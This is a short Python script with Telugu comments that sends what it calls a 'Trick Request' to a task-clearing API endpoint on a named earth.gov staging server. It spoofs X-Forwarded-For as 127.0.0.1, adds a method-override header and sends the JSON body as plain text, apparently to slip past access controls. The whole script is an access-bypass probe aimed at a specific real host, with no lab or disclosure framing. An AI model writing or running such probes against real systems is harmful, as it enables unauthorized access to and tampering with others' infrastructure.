import requests

url = "https://sm2a.staging.earth.gov/api/v1/dags/example/clearTaskInstances"

# 1. డబుల్ కంటెంట్ టైప్ ఇచ్చి చూద్దాం
headers = {
    "Content-Type": "application/json",
    "X-HTTP-Method-Override": "POST",
    "X-Forwarded-For": "127.0.0.1"
}

# 2. బాడీని జేసన్ లా కాకుండా ప్లెయిన్ టెక్స్ట్ లా పంపుదాం
raw_data = '{"dry_run": true, "reset_dag_runs": true}'

print(f"[*] Sending Trick Request to: {url}")

try:
    r = requests.post(url, data=raw_data, headers=headers, timeout=10)
    print(f"[!] Status Code: {r.status_code}")
    print(f"[!] Response: {r.text}")
except Exception as e:
    print(f"[!] Error: {e}")
